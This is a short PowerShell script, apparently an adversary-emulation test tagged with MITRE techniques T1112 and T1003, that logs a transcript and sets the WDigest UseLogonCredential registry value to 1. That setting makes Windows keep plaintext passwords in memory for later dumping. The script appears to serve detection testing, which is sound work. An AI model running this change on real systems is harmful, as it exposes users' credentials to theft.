<#
    T1112 - Modify Registry
    T1003 - OS Credential Dumping
    Behavior and detection : https://blog.netwrix.com/2022/10/11/wdigest-clear-text-passwords-stealing-more-than-a-hash/
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

$registryPath = "HKLM:\System\CurrentControlSet\Control\SecurityProviders\Wdigest"

#Check if Wdigest UseLogonCredential is Enabled in the registry 
$checkReg = (Get-ItemProperty -Path $registryPath).UseLogonCredential

#Enable Wdigest UseLogonCredential in the registry
If($checkReg -eq 0 -or $checkReg -eq $null){
    Set-ItemProperty -Path $registryPath -Name 'UseLogonCredential' -Value 1
} Elseif($checkReg -eq 1) {
    Write-Host "Wdigest is Already Enabled"
}

Stop-Transcript
